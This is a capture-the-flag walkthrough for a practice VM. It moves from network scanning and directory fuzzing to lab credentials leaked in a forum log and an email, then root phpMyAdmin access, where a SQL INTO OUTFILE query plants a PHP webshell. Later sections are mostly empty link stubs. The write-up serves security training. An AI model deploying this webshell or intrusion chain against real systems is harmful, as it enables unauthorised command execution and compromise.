# Writeup 1 - The treasure hunt way

## Writeups Map

![](https://i.imgur.com/LjQEswl.png)

## Summary

- [1. Finding the IP](#1-finding-the-ip)
- [2. Looking for running services](#2-looking-for-running-services)
- [3. Fuzzing access paths](#3-fuzzing-access-paths)
- [4. Inspecting the forum](#4-inspecting-the-forum)
- [5. Logging into the forum](#5-logging-into-the-forum)
- [6.2 Logging into the webmail](#62-logging-into-the-webmail)
- [7. Logging into Phpmyadmin](#7-logging-into-phpmyadmin)
- [8.2 Injecting a webshell](#82-injecting-a-webshell)
- [9. Getting a FTP access](#9-getting-a-ftp-access)
- [10.2 Getting SSH access as laurie](#102-getting-ssh-access-as-laurie)
- [11.2 Getting SSH access as thor](#112-getting-ssh-access-as-thor)
- [12. Getting SSH access as zaz](#12-getting-ssh-access-as-zaz)
- [14.3 Buffer overflow the setuid binary](#143-buffer-overflow-the-setuid-binary)

## Exploitation

### 1. Finding the IP

> Please note that this section may differ depending on your network configuration.

I have setup the VM in bridged network mode which means it has it's own ip on my local network

First we get our network address

```
PS C:\Users\user> ipconfig
Carte réseau sans fil Wi-Fi :

   Suffixe DNS propre à la connexion. . . :
   Adresse IPv6. . . . . . . . . . . . . .: 2a04:cec0:10f7:c1d1:83b9:f706:901f:e740
   Adresse IPv6 temporaire . . . . . . . .: 2a04:cec0:10f7:c1d1:6919:2648:8564:bd77
   Adresse IPv6 de liaison locale. . . . .: fe80::9b0e:c803:3db7:d80c%17
   Adresse IPv4. . . . . . . . . . . . . .: 192.168.140.56
   Masque de sous-réseau. . . . . . . . . : 255.255.255.0
   Passerelle par défaut. . . . . . . . . : fe80::24a7:dbff:fec2:243%17
                                       192.168.140.206
```

In this case the network ip and mask are `192.168.140.0/24`

First we use `nmap -sn` to scan the network for all hosts
```
nmap -sn 192.168.140.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-23 17:35 CEST
Nmap scan report for 192.168.140.112
Host is up (0.0012s latency).
Nmap scan report for 192.168.140.206
Host is up (0.0066s latency).
Nmap done: 256 IP addresses (2 hosts up) scanned in 43.33 seconds
```

We get two hosts, one is `192.168.140.206` which is the address present in the `ipconfig`, the other one is the VM

### 2. Looking for running services

Let's scan this ip with `nmap`
```
nmap 192.168.140.112
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-29 18:18 CEST
Nmap scan report for 192.168.140.112
Host is up (0.00032s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
443/tcp open  https
993/tcp open  imaps
```

### 3. Fuzzing access paths

Ports 80 and 443 are open which means a website is present on the machine, let's fuzz it with `dirb`

```
dirb https://192.168.140.112

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Wed May 29 18:20:23 2024
URL_BASE: https://192.168.140.112/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: https://192.168.140.112/ ----
+ https://192.168.140.112/cgi-bin/ (CODE:403|SIZE:291)
==> DIRECTORY: https://192.168.140.112/forum/
==> DIRECTORY: https://192.168.140.112/phpmyadmin/
+ https://192.168.140.112/server-status (CODE:403|SIZE:296)
==> DIRECTORY: https://192.168.140.112/webmail/

...
```

Let's access those links with our web browser

### 4. Inspecting the forum

Here is `https://192.168.140.112/forum`

![Imgur](https://i.imgur.com/9QEQoCv.png)

After close inspection the `Problem login` topic is a log file containing what looks to be login credentials

```
...
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2
Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Received disconnect from 161.202.39.38: 3: com.jcraft.jsch.JSchException: Auth fail [preauth]
Oct 5 08:46:01 BornToSecHackMe CRON[7549]: pam_unix(cron:session): session opened for user lmezard by (uid=1040)
...
```

These credentials allows us to connect to the forum as the user `lmezard`

### 5. Logging into the forum

> login: `lmezard`

> password: `!q\]Ej?*5K5cy*AJ`

After loggin in we get access to the user's profile which gives us an email

![Imgur](https://i.imgur.com/WFjQWXt.png)

We can try using this email and the password to access the webmail or get a SSH access

> From this step you can continue to all the following steps
> - [6.1 Getting SSH access](#61-getting-ssh-access-as-laurieborntosecnet)
> - [6.2 Logging into the webmail](#62-logging-into-the-webmail)

### 6.1 Getting SSH access as laurie@borntosec.net

> login: `laurie@borntosec.net`

> password: `!q\]Ej?*5K5cy*AJ` 

You can use the same credentials as the webmail to get a SSH access into the machine

> From this step you can continue to all the following steps
> - [13. Exploiting DirtyCow](./Writeup5.md#13-exploiting-dirtycow)
> - [14.1 Using fakeroot](./Writeup7.md#141-using-fakeroot)

### 6.2 Logging into the webmail

> login: `laurie@borntosec.net`

> password: `!q\]Ej?*5K5cy*AJ` 

After loggin in we get access to two mails

![Imgur](https://i.imgur.com/0Tu8PpH.png)


The `DB Access` mail contains login credentials

```
Hey Laurie,

You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$

Best regards.
```

### 7. Logging into Phpmyadmin

> login: `root`

> password: `Fg-'kKXBj87E:aJ$`

After login into Phpmyadmin we get a full `root` access to all DBs in the service

![Imgur](https://i.imgur.com/nijo5Hj.png)

Now we will try to get a `shell` to the machine by injecting a new `php` page into the forum that will execute the commands we give it

> From this step you can continue to all the following steps
> - [8.1 Injecting a reverse shell](./Writeup3.md#81-injecting-a-reverse-shell)
> - [8.2 Injecting a webshell](#82-injecting-a-webshell)
> - [8.3 Exploiting suExec]()

### 8.2 Injecting a webshell

We will use a SQL command to create a new file inside the forum pages directory

```SQL
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE 'FORUM_LOCATION/PAGE_LOCATION'
```

First we have to find the `FORUM_LOCATION` and `PAGE_LOCATION` to create the new page

Knowing the forum is using Apache, the app location is usually `/var/www`

Using `dirb` we can scan the forum for directories

```
dirb https://192.168.140.112/forum

---- Scanning URL: https://192.168.140.112/forum/ ----
+ https://192.168.140.112/forum/backup (CODE:403|SIZE:295)
+ https://192.168.140.112/forum/config (CODE:403|SIZE:295)
==> DIRECTORY: https://192.168.140.112/forum/images/
==> DIRECTORY: https://192.168.140.112/forum/includes/
+ https://192.168.140.112/forum/index (CODE:200|SIZE:4984)
+ https://192.168.140.112/forum/index.php (CODE:200|SIZE:4984)
==> DIRECTORY: https://192.168.140.112/forum/js/
==> DIRECTORY: https://192.168.140.112/forum/lang/
==> DIRECTORY: https://192.168.140.112/forum/modules/
==> DIRECTORY: https://192.168.140.112/forum/templates_c/
==> DIRECTORY: https://192.168.140.112/forum/themes/
==> DIRECTORY: https://192.168.140.112/forum/update/
```

Now we can try uploading the `shell.php` file on each directory using the command in `Phpmyadmin`

It only worked in `/forum/templaces_c` the full command will be

```SQL
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/forum/templates_c/shell.php'
```

![Imgur](https://i.imgur.com/WQTxCBU.png)

Now we can use this script as a webshell passing `cmd=COMMAND_TO_EXECUTE` as argument

![Imgur](https://i.imgur.com/f1uJEy6.png)

### 9.1 Getting a Terminal access as www-data

Now that we have a terminal-like access as the user www-data we can use it in multiple ways, in this writeup we will focus on the treasure hunt way

> From this step you can continue to all the following steps
> - [9.2 Getting a FTP access](#92-getting-a-ftp-access)
> - [10.1 Download squashfs file](./Writeup6.md#101-downloading-squashfs-file)
> - [13 Exploiting DirtyCow](./Writeup5.md#13-exploiting-dirtycow)
> - [14.1 Use fakeroot](./Writeup7.md#141-using-fakeroot)

### 9.2 Getting a FTP access

Now that we have a shell access as user `www-data`, we will look into the machine to find usefull information

Starting in `/home/` we can see multiple users

![Imgur](https://i.imgur.com/9A92ko1.png)

We have `read` permissions only on the `/home/LOOKATME` directory

It contains a single file `password` with the following content

```
lmezard:G!@M6f4Eatau{sF"
```

This looks like credentials, we can use them to connect to the FTP 

> login: `lmezard`

> password: `G!@M6f4Eatau{sF"`

![Imgur](https://i.imgur.com/dKhMw9p.png)

We have two files in the FTP server, `fun` and `README`

`README` contains some instructions

```
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```

### 10.2 Getting SSH access as laurie

> From this step you can continue to all the following steps
> - [11.2 Getting SSH access as thor](#112-getting-ssh-access-as-thor)
> - [13. Exploiting DirtyCow](./Writeup5.md#13-exploiting-dirtycow)

### 11.2 Getting SSH access as thor

> From this step you can continue to all the following steps
> - [12. Getting SSH access as zaz](#12-getting-ssh-access-as-zaz)
> - [13. Exploiting DirtyCow](./Writeup5.md#13-exploiting-dirtycow)

### 12. Getting SSH access as zaz

> From this step you can continue to all the following steps
> - [13. Exploiting DirtyCow](./Writeup5.md#13-exploiting-dirtycow)
> - [14.3 Buffer overflow the setuid binary](#143-buffer-overflow-the-setuid-binary)

### 14.3 Buffer overflow the setuid binary